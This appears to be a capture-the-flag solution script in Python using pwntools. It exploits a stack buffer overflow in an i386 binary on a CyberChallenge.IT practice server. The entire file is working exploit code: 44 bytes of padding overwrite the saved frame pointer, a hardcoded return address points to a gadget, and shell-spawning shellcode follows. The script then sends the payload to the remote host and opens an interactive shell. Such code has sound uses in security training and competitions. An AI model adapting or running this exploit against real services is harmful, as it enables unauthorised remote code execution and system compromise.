from pwn import *


context.arch = 'i386'
buff_length = 40

RIP = p32(0x08048593)		# Indirizzo del gadget
shellcode = asm(shellcraft.i386.linux.sh())		# Spawn a shell
padding = b"A" * 40 + b"B" * 4		# Buff + $ebp

payload = padding + RIP + shellcode

conn = remote('shell.challs.cyberchallenge.it', '9123')
conn.send(payload)
conn.interactive()
